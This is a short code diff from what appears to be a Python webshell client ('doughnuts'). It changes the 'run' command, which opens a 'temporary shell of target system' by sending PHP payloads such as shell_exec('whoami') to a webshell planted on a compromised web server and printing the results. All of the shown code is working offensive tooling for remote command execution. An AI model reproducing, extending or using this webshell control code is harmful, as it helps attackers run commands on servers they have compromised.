@@ -70,20 +70,21 @@ NEW_UNIX_WORDLIST = {"common_wordlist": [
 
 
 @alias(True, func_alias="s", c="command")
-def run(command: str = ""):
+def run(*commands):
     """
     shell
 
     Get a temporary shell of target system by system function or just run a shell command.
     """
-    if (len(command)):
+    if (len(commands)):
+        command = " ".join((str(c) for c in commands))
         res = send(get_system_code(command))
         if (not res):
             return
-        print(color.green("\nResult:\n") + res.r_text.strip() + "\n")
+        print(color.green("\nResult:\n\n") + res.r_text.strip() + "\n")
         return
     print(color.cyan("Eenter interactive temporary shell...\n\nUse 'back' command to return doughnuts.\n"))
-    res = send(f'print(shell_exec("whoami")."@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
+    res = send(f'{get_system_code("whoami")}print("@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
     prompt, pwd = res.split("|")
     set_namespace("webshell", False, True)
     wordlist = gget("webshell.wordlist")
